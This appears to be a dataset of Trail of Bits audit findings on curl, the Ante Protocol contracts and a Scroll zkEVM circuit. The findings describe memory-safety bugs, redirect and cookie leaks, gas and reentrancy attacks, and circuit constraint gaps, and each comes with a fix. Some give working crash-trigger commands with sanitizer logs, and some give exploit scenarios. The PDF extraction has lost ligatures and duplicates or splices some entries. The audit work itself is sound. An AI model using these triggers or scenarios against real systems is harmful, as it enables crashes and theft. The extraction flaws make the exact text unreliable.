( struct connectdata *conn) // (...) 814 Curl_safefree(conn->connect_state); Figure 7.3: The conn_free function that frees the http_connect_state struct for HTTP CONNECT ( curl/lib/url.c#787814 ) void Curl_free_request_state ( struct Curl_easy *data) 2257 2258 { 2259 2260 Curl_safefree(data->req.p.http); Curl_safefree(data->req.newurl); Figure 7.4: The Curl_free_request_state function that frees elements in the Curl_easy struct, which leads to a double free vulnerability ( curl/lib/url.c#22572260 ) Exploit Scenario An attacker nds a way to exploit the double free vulnerability described in this nding either in cURL or in a program that uses libcurl and gets remote code execution on the machine from which the cURL code was executed. Recommendations Short term, x the double free vulnerability described in this nding. Long term, expand cURLs unit tests and fuzz tests to cover dierent types of proxies for supported protocols. Also, extend the fuzzing strategy to cover argv fuzzing. It can be obtained using the approach presented in the argv-fuzz-inl.h from the AFL++ project. This will force the fuzzer to build an argv pointer array (which points to arguments passed to the cURL) from NULL-delimited standard input. Finally, consider adding a dictionary with possible options and protocols to the fuzzer based on the source code or on cURLs manual.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "8. Some ags override previous instances of themselves ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "Some cURL ags, when provided multiple times, overrides themselves and eectively use the last ag provided. If a ag makes cURL invocations security options more strict, then accidental overwriting may weaken the desired security. The identied ag with this property is the --crlfile command-line option. It allows users to pass a PEM-formatted certicate revocation list to cURL. --crlfile <file> List that may specify peer certificates that are to be considered revoked. (TLS) Provide a file using PEM format with a Certificate Revocation If this option is used several times, the last one will be used. Example: curl --crlfile rejects.txt https://example.com Added in 7.19.7. Figure 8.1: The description of the --crlfile option Exploit Scenario A user wishes for cURL to reject certicates specied across multiple certicate revocation lists. He unwittingly uses the --crlfile ag multiple times, dropping all but the last-specied list. Requests the user sends with cURL are intercepted by a Man-in-the-Middle attacker, who uses a known-compromised certicate to bypass TLS protections. Recommendations Short term, change the behavior of --crlfile to append new certicates to the revocation list, not to replace those specied earlier. If backwards compatibility prevents this, have cURL issue a warning such as  --crlfile specified multiple times, using only <filename.txt> . Long term, ensure that behavior, such as how multiple instances of a command-line argument are handled, is consistent throughout the application. Issue a warning when a security-relevant ag is provided multiple times.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "9. Cookies are not stripped after redirect ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "If cookies are passed to cURL via the --cookie ag, they will not be stripped if the target responds with a redirect. RFC 9110 section 15.4, Redirection 3xx , does not specify whether or not cookies should be stripped during a redirect; as such, it may be better to err on the side of caution and strip them by default if the origin changed. The recommended behavior would match the current behavior with cookie jar (i.e., when a server sets a new cookie and requests a redirect) and Authorization header (which is stripped on cross-origin redirects). Recommendations Short term, if backwards compatibility would not prohibit such a change, strip cookies upon a redirect to a dierent origin by default and provide a command-line ag that enables the previous behavior (or extend the --location-trusted ag). Long term, in cases where a specication is ambiguous and practicality allows, always default to the most secure possible interpretation. Extend tests to check for behavior of passing data after redirection.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "10. Use after free while using parallel option and sequences ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "Using cURL with parallel option ( -Z ), two consecutive sequences (that end up creating 51 hosts), and an unmatched bracket triggers a use-after-free vulnerability (gure 10.1). The add_parallel_transfers function allocates memory blocks for an error buer; consequently, by default, it allows up to 50 transfers (gure 10.2, line 2228). Then, in the Curl_failf function, it copies errors (e.g., Could not resolve host: q{ ) to appropriate error buers when connections fail (gure 10.3) and frees the memory. For the last sequence ( u~ host), it allocates a memory buer (gure 10.2), frees a buer (gure 10.3), and copies an error ( Could not resolve host: u~ ) to the previously freed memory buer (gure 10.4). $ curl 0 -Z [q-u][u-~] } curl: (7) Failed to connect to 0.0.0.0 port 80 after 0 ms: Connection refused curl: (3) unmatched close brace/bracket in URL position 1: } ^ curl: (6) Could not resolve host: q{ curl: (6) Could not resolve host: q| curl: (6) Could not resolve host: q} curl: (6) Could not resolve host: q~ curl: (6) Could not resolve host: r{ curl: (6) Could not resolve host: r| curl: (6) Could not resolve host: r} curl: (6) Could not resolve host: r~ curl: (6) Could not resolve host: s{ curl: (6) Could not resolve host: s| curl: (6) Could not resolve host: s} curl: (6) Could not resolve host: s~ curl: (6) Could not resolve host: t{ curl: (6) Could not resolve host: t| curl: (6) Could not resolve host: t} curl: (6) Could not resolve host: t~ curl: (6) Could not resolve host: u{ curl: (6) Could not resolve host: u| curl: (6) Could not resolve host: u} curl: (3) unmatched close brace/bracket in URL position 1: } ^ ====2789144==ERROR: AddressSanitizer: heap-use-after-free on address 0x611000004780 at pc 0x7f9b5f94016d bp 0x7fff12d4dbc0 sp 0x7fff12d4d368 WRITE of size #0 0x7f9b5f94016c in __interceptor_strcpy ../../../../src/libsanitizer/asan/asan_interceptors. cc : 431 #1 0x7f9b5f7ce6f4 in strcpy /usr/ include /x86_64-linux-gnu/bits/string_fortified. h : 90 #2 0x7f9b5f7ce6f4 in Curl_failf /home/scooby/curl/lib/sendf. c : 275 #3 0x7f9b5f78309a in Curl_resolver_error /home/scooby/curl/lib/hostip. c : 1316 #4 0x7f9b5f73cb6f in Curl_resolver_is_resolved /home/scooby/curl/lib/asyn-thread. c : 596 #5 0x7f9b5f7bc77c in multi_runsingle /home/scooby/curl/lib/multi. c : 1979 #6 0x7f9b5f7bf00f in curl_multi_perform /home/scooby/curl/lib/multi. c : 2684 #7 0x55d812f7609e in parallel_transfers /home/scooby/curl/src/tool_operate. c : 2308 #8 0x55d812f7609e in run_all_transfers /home/scooby/curl/src/tool_operate. c : 2618 #9 0x55d812f7609e in operate /home/scooby/curl/src/tool_operate. c : 2732 #10 0x55d812f4ffa8 in main /home/scooby/curl/src/tool_main. c : 276 #11 0x7f9b5f1aa082 in __libc_start_main ../csu/libc- start . c : 308 #12 0x55d812f506cd in _start (/usr/ local /bin/curl+ 0x316cd ) 0x611000004780 is located 0 bytes inside of 256-byte region [0x611000004780,0x611000004880) freed by thread T0 here: #0 0x7f9b5f9b140f in __interceptor_free ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:122 #1 0x55d812f75682 in add_parallel_transfers /home/scooby/curl/src/tool_operate.c:2251 previously allocated by thread T0 here: #0 0x7f9b5f9b1808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x55d812f75589 in add_parallel_transfers /home/scooby/curl/src/tool_operate.c:2228 SUMMARY: AddressSanitizer: heap-use-after-free ../../../../src/libsanitizer/asan/asan_interceptors.cc:431 in __interceptor_strcpy Shadow bytes around the buggy address: 0x0c227fff88a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff88b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff88c0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c227fff88d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff88e0: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa =>0x0c227fff88f0:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff8900: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff8910: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c227fff8920: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff8930: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa 0x0c227fff8940: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Heap left redzone: fa Freed heap region: fd ==2789144==ABORTING Figure 10.1: Reproducing use-after-free vulnerability with ASAN log 2192 static CURLcode add_parallel_transfers ( struct GlobalConfig *global, CURLM *multi, CURLSH *share, bool *morep, bool *addedp) 2197 { // (...) 2210 for (per = transfers; per && (all_added < global->parallel_max); per = per->next) { 2227 2228 // (...) 2249 if (!errorbuf) { errorbuf = malloc(CURL_ERROR_SIZE); result = create_transfer(global, share, &getadded); 2250 2251 2252 2253 if (result) { free(errorbuf); return result; } Figure 10.2: The add_parallel_transfers function ( curl/src/tool_operate.c#21922253 ) 264 265 { void Curl_failf ( struct Curl_easy *data, const char *fmt, ...) // (...) 275 strcpy(data->set.errorbuffer, error); Figure 10.3: The Curl_failf function that copies appropriate error to the error buer ( curl/lib/sendf.c#264275 ) Exploit Scenario An administrator sets up a service that calls cURL, where some of the cURL command-line arguments are provided from external, untrusted input. An attacker manipulates the input to exploit the use-after-free bug to run arbitrary code on the machine that runs cURL. Recommendations Short term, x the use-after-free vulnerability described in this nding. Long term, extend the fuzzing strategy to cover argv fuzzing. It can be obtained using the argv-fuzz-inl.h from the AFL++ project to build argv from stdin in the cURL. Also, consider adding a dictionary with possible options and protocols to the fuzzer based on the source code or cURLs manual.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "11. Unused memory blocks are not freed resulting in memory leaks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "For specic commands (gure 11.1, 11.2, 11.3), cURL allocates blocks of memory that are not freed when they are no longer needed, leading to memory leaks. $ curl 0 -Z 0 -Tz 0 curl: Can 't open ' z '! curl: try ' curl --help ' or ' curl --manual' for more information curl: ( 26 ) Failed to open/read local data from file/application ============= 2798000 ==ERROR: LeakSanitizer: detected memory leaks Direct leak of 4848 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eba06 in __interceptor_calloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:153 #1 0x561bb1d1dc9f in glob_url /home/scooby/curl/src/tool_urlglob.c:459 Indirect leak of 8 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eb808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x561bb1d1e06c in glob_fixed /home/scooby/curl/src/tool_urlglob.c:48 #2 0x561bb1d1e06c in glob_parse /home/scooby/curl/src/tool_urlglob.c:411 #3 0x561bb1d1e06c in glob_url /home/scooby/curl/src/tool_urlglob.c:467 Indirect leak of 2 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eb808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x561bb1d1e0b0 in glob_fixed /home/scooby/curl/src/tool_urlglob.c:53 #2 0x561bb1d1e0b0 in glob_parse /home/scooby/curl/src/tool_urlglob.c:411 #3 0x561bb1d1e0b0 in glob_url /home/scooby/curl/src/tool_urlglob.c:467 Indirect leak of 2 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eb808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x561bb1d1dc6a in glob_url /home/scooby/curl/src/tool_urlglob.c:454 Figure 11.1: Reproducing memory leaks vulnerability in the tool_urlglob.c le with LeakSanitizer log. $ curl 00 --cu 00 curl: ( 7 ) Failed to connect to 0 .0.0.0 port 80 after 0 ms: Connection refused ============= 2798691 ==ERROR: LeakSanitizer: detected memory leaks Direct leak of 3 byte(s) in 1 object(s) allocated from: #0 0x7fbc6811b3ed in __interceptor_strdup ../../../../src/libsanitizer/asan/asan_interceptors.cc:445 #1 0x56412ed047ee in getparameter /home/scooby/curl/src/tool_getparam.c:1885 SUMMARY: AddressSanitizer: 3 byte(s) leaked in 1 allocation(s). Figure 11.2: Reproducing a memory leak vulnerability in the tool_getparam.c le with LeakSanitizer log $ curl --proto = 0 --proto = 0 Warning: unrecognized protocol '0' Warning: unrecognized protocol '0' curl: no URL specified! curl: try 'curl --help' or 'curl --manual' for more information ================================================================= == 2799783 ==ERROR: LeakSanitizer: detected memory leaks Direct leak of 1 byte(s) in 1 object(s) allocated from: #0 0x7f90391803ed in __interceptor_strdup ../../../../src/libsanitizer/asan/asan_interceptors.cc:445 #1 0x55e405955ab7 in proto2num /home/scooby/curl/src/tool_paramhlp.c:385 SUMMARY: AddressSanitizer: 1 byte(s) leaked in 1 allocation(s). Figure 11.3: Reproducing a memory leak vulnerability in the tool_paramhlp.c le with LeakSanitizer log Exploit Scenario An attacker nds a way to allocate extensive lots of memory on the local machine, which leads to the overconsumption of resources and a denial-of-service attack. Recommendations Short term, x memory leaks described in this nding by freeing memory blocks that are no longer needed. Long term, extend the fuzzing strategy to cover argv fuzzing. It can be obtained using the argv-fuzz-inl.h from the AFL++ project to build argv from stdin in the cURL. Also, consider adding a dictionary with possible options and protocols to the fuzzer based on the source code or cURLs manual.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "12. Referer header is generated in insecure manner ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "The cURL automatically sets the referer header for HTTP redirects when provided with the --referer ;auto ag. The header set contains the entire original URL except for the user-password fragment. The URL includes query parameters, which is against current best practices for handling the referer , which say to default to the strict-origin-when-cross-origin option. The option instructs clients to send only the URLs origin for cross-origin redirect, and not to send the header to less secure destinations (e.g., when redirecting from HTTPS to HTTP protocol). Exploit Scenario An user uses cURL to send a request to a server that requires multi-step authorization. He provides the authorization token as a query parameter and enables redirects with --location ag. Because of the server misconguration, a 302 redirect response with an incorrect Location header that points to a third-party domain is sent back to the cURL. The cURL requests the third-party domain, leaking the authorization token via the referer header. Recommendations Short term, send only the origin instead of the whole URL on cross-origin requests in the referer header. Consider not sending the header on redirects downgrading the security level. Additionally, consider implementing support for the Referrer-Policy response header. Alternatively, introduce a new ag that would allow users to set the desired referrer policy manually. Long term, review response headers that change behavior of HTTP redirects and ensure either that they are supported by the cURL or that secure defaults are implemented. References  Feature: Referrer Policy: Default to strict-origin-when-cross-origin", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "13. Redirect to localhost and local network is possible (Server-side request forgery like) ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "When redirects are enabled with cURL (i.e., the --location ag is provided), then a server may redirect a request to an arbitrary endpoint, and the cURL will issue a request to it. This gives requested servers partial access to cURLs users local networks. The issue is similar to the Server-Side Request Forgery (SSRF) attack vector, but in the context of the client application. Exploit Scenario An user sends a request using cURL to a malicious server using the --location ag. The server responds with a 302 redirect to http://192.168.0.1:1080?malicious=data endpoint, accessing the user's router admin panel. Recommendations Short term, add a warning about this attack vector in the --location ag documentation. Long term, consider disallowing redirects to private networks and loopback interface by either introducing a new ag that would disable the restriction or extending the --location-trusted ag functionality.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "14. URL parsing from redirect is incorrect when no path separator is provided ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "When cURL parses a URL from the Location header for an HTTP redirect and the URL does not contain a path separator (/), the cURL incorrectly duplicates query strings (i.e., data after the question mark) and fragments (data after cross). The cURL correctly parses similar URLs when they are provided directly in the command line. This behavior indicates that dierent parsers are used for direct URLs and URLs from redirects, which may lead to further bugs. $ curl -v -L 'http://local.test?redirect=http://local.test:80?-123' * Trying 127 .0.0.1:80... * Connected to local.test ( 127 .0.0.1) port 80 ( #0) > GET /?redirect=http://local.test:80?-123 HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 302 Found < Location: http://local.test:80?-123 < Date: Mon, 10 Oct 2022 14 :53:46 GMT < Connection: keep-alive < Keep-Alive: timeout = 5 < Transfer-Encoding: chunked < * Ignoring the response-body * Connection #0 to host local.test left intact * Issue another request to this URL: 'http://local.test:80/?-123?-123' * Found bundle for host: 0x6000039287b0 [serially] * Re-using existing connection #0 with host local.test * Connected to local.test ( 127 .0.0.1) port 80 ( #0) > GET /?-123?-123 HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 200 OK < Date: Mon, 10 Oct 2022 14 :53: < Connection: keep-alive < Keep-Alive: timeout = 5 < Content-Length: 16 < * Connection #0 to host local.test left intact HTTP Connection! Figure 14.1: Example logging output from cURL, presenting the bug in parsing URLs from the Location header, with port and query parameters $ curl -v -L 'http://local.test?redirect=http://local.test%23-123' * Trying 127 .0.0.1:80... * Connected to local.test ( 127 .0.0.1) port 80 ( #0) > GET /?redirect=http://local.test%23-123 HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 302 Found < Location: http://local.test#-123 < Date: Mon, 10 Oct 2022 14 :56:05 GMT < Connection: keep-alive < Keep-Alive: timeout = 5 < Transfer-Encoding: chunked < * Ignoring the response-body * Connection #0 to host local.test left intact * Issue another request to this URL: 'http://local.test/#-123#-123' * Found bundle for host: 0x6000003f47b0 [serially] * Re-using existing connection #0 with host local.test * Connected to local.test ( 127 .0.0.1) port 80 ( #0) > GET / HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 200 OK < Date: Mon, 10 Oct 2022 14 :56:05 GMT < Connection: keep-alive < Keep-Alive: timeout = 5 < Content-Length: 16 < * Connection #0 to host local.test left intact HTTP Connection! Figure 14.2: Example logging output from cURL, presenting the bug in parsing URLs from Location header, without port and with fragment Exploit Scenario A user of cURL accesses data from a server. The server redirects cURL to another endpoint. cURL incorrectly duplicates the query string in the new request. The other endpoint uses the incorrect data, which negatively aects the user. Recommendations Short term, x the parsing bug in the Location header parser. Long term, use a single, centralized API for URL parsing in the whole cURL codebase. Expand tests with checks of parsing of redirect responses.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "1. AntePoolFactory does not validate create2 return addresses ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf", "body": "The AntePoolFactory uses the create2 instruction to deploy an AntePool and then initializes it with an already-deployed AnteTest address. However, the AntePoolFactory does not validate the address returned by create2, which will be the zero address if the deployment operation fails. bytes memory bytecode = type(AntePool).creationCode; bytes32 salt = keccak256(abi.encodePacked(testAddr)); assembly { testPool := create2(0, add(bytecode, 0x20), mload(bytecode), salt) } poolMap[testAddr] = testPool; allPools.push(testPool); AntePool(testPool).initialize(anteTest); emit AntePoolCreated(testAddr, testPool); Figure 1.1: contracts/AntePoolFactory.sol#L35-L47 This lack of validation does not currently pose a problem, because the simplicity of AntePool contracts helps prevent deployment failures (and thus the return of the zero address). However, deployment issues could become more likely in future iterations of the Ante Protocol. Recommendations Short term, have the AntePoolFactory check the address returned by the create2 operation against the zero address. Long term, ensure that the results of operations that return a zero address in the event of a failure (such as create2 and ecrecover operations) are validated appropriately.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. Events emitted during critical operations omit certain details ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf", "body": "Events are generally emitted for all critical state-changing operations within the system. However, the AntePoolCreated event emitted by the AntePoolFactory does not capture the address of the msg.sender that deployed the AntePool. This information would help provide a more complete audit trail in the event of an attack, as the msg.sender often refers to the externally owned account that sent the transaction but could instead refer to an intermediate smart contract address. emit AntePoolCreated(testAddr, testPool); Figure 2.1: contracts/AntePoolFactory.sol#L47 Additionally, consider having the AntePool.updateDecay method emit an event with the pool share parameters used in decay calculations. Recommendations Short term, capture the msg.sender in the AntePoolFactory.AntePoolCreated event, and have AntePool.updateDecay emit an event that includes the relevant decay calculation parameters. Long term, ensure critical state-changing operations trigger events sucient to form an audit trail in the event of a system failure. Events should capture relevant parameters to help auditors determine the cause of failure. 3. Insu\u0000cient gas can cause AnteTests to produce false positives Severity: High Diculty: High Type: Data Validation Finding ID: TOB-ANTE-3 Target: contracts/AntePool.sol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "4. Looping over an array of unbounded size can cause a denial of service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf", "body": "If an AnteTest fails, the _checkTestNoRevert function will return false, causing the checkTest function to call _calculateChallengerEligibility to compute eligibleAmount; this value is the total stake of the eligible challengers and is used to calculate the proportion of _remainingStake owed to each challenger. To calculate eligibleAmount, the _calculateChallengerEligibility function loops through an unbounded array of challenger addresses. When the number of challengers is large, the function will consume a large quantity of gas in this operation. function _calculateChallengerEligibility() internal { uint256 cutoffBlock = failedBlock.sub(CHALLENGER_BLOCK_DELAY); for (uint256 i = 0; i < challengers.addresses.length; i++) { address challenger = challengers.addresses[i]; if (eligibilityInfo.lastStakedBlock[challenger] < cutoffBlock) { eligibilityInfo.eligibleAmount = eligibilityInfo.eligibleAmount.add( _storedBalance(challengerInfo.userInfo[challenger], challengerInfo) ); } } } Figure 4.1: contracts/AntePool.sol#L553-L563 However, triggering an out-of-gas error would be costly to an attacker; the attacker would need to create many accounts through which to stake funds, and the amount of each stake would decay over time. Exploit Scenario The length of the challenger address array grows such that the computation of the eligibleAmount causes the block to reach its gas limit. Then, because of this Ethereum-imposed gas constraint, the entire transaction reverts, and the failing AnteTest is not marked as failing. As a result, challengers who have staked funds in anticipation of a failed test will not receive a payout. Recommendations Short term, determine the number of challengers that can enter an AntePool without rendering the _calculateChallengerEligibility functions operation too gas intensive; then, use that number as the upper limit on the number of challengers. Long term, avoid calculating every challengers proportion of _remainingStake in the same operation; instead, calculate each user's pro-rata share when he or she enters the pool and modify the challenger delay to require that a challenger register and wait 12 blocks before minting his or her pro-rata share. Upon a test failure, a challenger would burn these shares and redeem them for ether.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "2. Events emitted during critical operations omit certain details ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf", "body": "Events are generally emitted for all critical state-changing operations within the system. However, the AntePoolCreated event emitted by the AntePoolFactory does not capture the address of the msg.sender that deployed the AntePool. This information would help provide a more complete audit trail in the event of an attack, as the msg.sender often refers to the externally owned account that sent the transaction but could instead refer to an intermediate smart contract address. emit AntePoolCreated(testAddr, testPool); Figure 2.1: contracts/AntePoolFactory.sol#L47 Additionally, consider having the AntePool.updateDecay method emit an event with the pool share parameters used in decay calculations. Recommendations Short term, capture the msg.sender in the AntePoolFactory.AntePoolCreated event, and have AntePool.updateDecay emit an event that includes the relevant decay calculation parameters. Long term, ensure critical state-changing operations trigger events sucient to form an audit trail in the event of a system failure. Events should capture relevant parameters to help auditors determine the cause of failure.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "3. Insu\u0000cient gas can cause AnteTests to produce false positives ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf", "body": "Once challengers have staked ether and the challenger delay has passed, they can submit transactions to predict that a test will fail and to earn a bonus if it does. An attacker could manipulate the result of an AnteTest by providing a limited amount of gas to the checkTest function, forcing the test to fail. This is because the anteTest.checkTestPasses function receives 63/64 of the gas provided to checkTest (per the 63/64 gas forwarding rule), which may not be enough. This issue stems from the use of a try-catch statement in the _checkTestNoRevert function, which causes the function to return false when an EVM exception occurs, indicating a test failure. We set the diculty of this nding to high, as the outer call will also revert with an out-of-gas exception if it requires more than 1/64 of the gas; however, other factors (e.g., the block gas limit) may change in the future, allowing for a successful exploitation. if (!_checkTestNoRevert()) { updateDecay(); verifier = msg.sender; failedBlock = block.number; pendingFailure = true; _calculateChallengerEligibility(); _bounty = getVerifierBounty(); uint256 totalStake = stakingInfo.totalAmount.add(withdrawInfo.totalAmount); _remainingStake = totalStake.sub(_bounty); Figure 3.1: Part of the checkTest function /// @return passes bool if the Ante Test passed function _checkTestNoRevert() internal returns (bool) { try anteTest.checkTestPasses() returns (bool passes) { return passes; } catch { return false; } } Figure 3.2: contracts/AntePool.sol#L567-L573 Exploit Scenario An attacker calculates the amount of gas required for checkTest to run out of gas in the inner call to anteTest.checkTestPasses. The test fails, and the attacker claims the verier bonus. Recommendations Short term, ensure that the AntePool reverts if the underlying AnteTest does not have enough gas to return a meaningful value. Long term, redesign the test verication mechanism such that gas usage does not cause false positives.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "5. Reentrancy into AntePool.checkTest scales challenger eligibility amount ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf", "body": "A malicious AnteTest or underlying contract being tested can trigger multiple failed checkTest calls by reentering the AntePool.checkTest function. With each call, the _calculateChallengerEligibility method increases the eligibleAmount instead of resetting it, causing the eligibleAmount to scale unexpectedly with each reentrancy. function checkTest() external override testNotFailed { require(challengers.exists(msg.sender), \"ANTE: Only challengers can checkTest\"); require( block.number.sub(eligibilityInfo.lastStakedBlock[msg.sender]) > CHALLENGER_BLOCK_DELAY, \"ANTE: must wait 12 blocks after challenging to call checkTest\" ); numTimesVerified = numTimesVerified.add(1); lastVerifiedBlock = block.number; emit TestChecked(msg.sender); if (!_checkTestNoRevert()) { updateDecay(); verifier = msg.sender; failedBlock = block.number; pendingFailure = true; _calculateChallengerEligibility(); _bounty = getVerifierBounty(); uint256 totalStake = stakingInfo.totalAmount.add(withdrawInfo.totalAmount); _remainingStake = totalStake.sub(_bounty); emit FailureOccurred(msg.sender); } } Figure 5.1: contracts/AntePool.sol#L292-L316 function _calculateChallengerEligibility() internal { uint256 cutoffBlock = failedBlock.sub(CHALLENGER_BLOCK_DELAY); for (uint256 i = 0; i < challengers.addresses.length; i++) { address challenger = challengers.addresses[i]; if (eligibilityInfo.lastStakedBlock[challenger] < cutoffBlock) { eligibilityInfo.eligibleAmount = eligibilityInfo.eligibleAmount.add( _storedBalance(challengerInfo.userInfo[challenger], challengerInfo) ); } } } Figure 5.2: contracts/AntePool.sol#L553-L563 Appendix D includes a proof-of-concept AnteTest contract and hardhat unit test that demonstrate this issue. Exploit Scenario An attacker deploys an AnteTest contract or a vulnerable contract to be tested. The attacker directs the deployed contract to call AntePool.stake, which registers the contract as a challenger. The malicious contract then reenters AntePool.checkTest and triggers multiple failures within the same call stack. As a result, the AntePool makes multiple calls to the _calculateChallengerEligibility method, which increases the challenger eligibility amount with each call. This results in a greater-than-expected loss of pool funds. Recommendations Short term, implement checks to ensure the AntePool contracts methods cannot be reentered while checkTest is executing. Long term, ensure that all calls to external contracts are reviewed for reentrancy risks. To prevent a reentrancy from causing undened behavior in the system, ensure state variables are updated in the appropriate order; alternatively (and if sensible) disallow reentrancy altogether. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "1. PoseidonLookup is not implemented ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf", "body": "Poseidon hashing is performed within the MPT circuit by performing lookups into a Poseidon table via the PoseidonLookup trait, shown in gure 1.1. /// Lookup represent the poseidon table in zkevm circuit pub trait PoseidonLookup { fn lookup_columns(&self) -> (FixedColumn, [AdviceColumn; 5]) { let (fixed, adv) = self.lookup_columns_generic(); (FixedColumn(fixed), adv.map(AdviceColumn)) } fn lookup_columns_generic(&self) -> (Column<Fixed>, [Column<Advice>; 5]) { let (fixed, adv) = self.lookup_columns(); (fixed.0, adv.map(|col| col.0)) } } Figure 1.1: src/gadgets/poseidon.rs#1121 This trait is not implemented by any types except the testing-only PoseidonTable shown in gure 1.2, which does not constrain its columns at all. #[cfg(test)] #[derive(Clone, Copy)] pub struct PoseidonTable { q_enable: FixedColumn, left: AdviceColumn, right: AdviceColumn, hash: AdviceColumn, control: AdviceColumn, head_mark: AdviceColumn, } #[cfg(test)] impl PoseidonTable { pub fn configure<F: FieldExt>(cs: &mut ConstraintSystem<F>) -> Self { let [hash, left, right, control, head_mark] = [0; 5].map(|_| AdviceColumn(cs.advice_column())); Self { left, right, hash, control, head_mark, q_enable: FixedColumn(cs.fixed_column()), } } Figure 1.2: src/gadgets/poseidon.rs#5680 The rest of the codebase treats this trait as a black-box implementation, so this does not seem to cause correctness problems elsewhere. However, it does limit ones ability to test some negative cases, and it makes the test coverage rely on the correctness of the PoseidonTable structs witness generation. Recommendations Short term, create a concrete implementation of the PoseidonLookup trait to enable full testing of the MPT circuit. Long term, ensure that all parts of the MPT circuit are tested with both positive and negative tests.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "2. IsZeroGadget does not constrain the inverse witness when the value is zero ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf", "body": "The IsZeroGadget implementation allows for an arbitrary inverse_or_zero witness value when the value parameter is 0. The gadget returns 1 when value is 0; otherwise, it returns 0. The implementation relies on the existence of an inverse for when value is nonzero and on correctly constraining that value * (1 - value * inverse_or_zero) == 0. However, when value is 0, the constraint is immediately satised, regardless of the value of the inverse_or_zero witness. This allows an arbitrary value to be provided for that witness value. pub fn configure<F: FieldExt>( cs: &mut ConstraintSystem<F>, cb: &mut ConstraintBuilder<F>, value: AdviceColumn, // TODO: make this a query once Query is clonable/copyable..... ) -> Self { let inverse_or_zero = AdviceColumn(cs.advice_column()); cb.assert_zero( \"value is 0 or inverse_or_zero is inverse of value\", value.current() * (Query::one() - value.current() * inverse_or_zero.current()), ); Self { value, inverse_or_zero, } } Figure 2.1: mpt-circuit/src/gadgets/is_zero.rs#4862 Recommendations Short term, ensure that the circuit is deterministic by constraining inverse_or_zero to equal 0 when value is 0. Long term, document which circuits have nondeterministic witnesses; over time, constrain them so that all circuits have deterministic witnesses.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "3. The MPT nonexistence proof gadget is missing 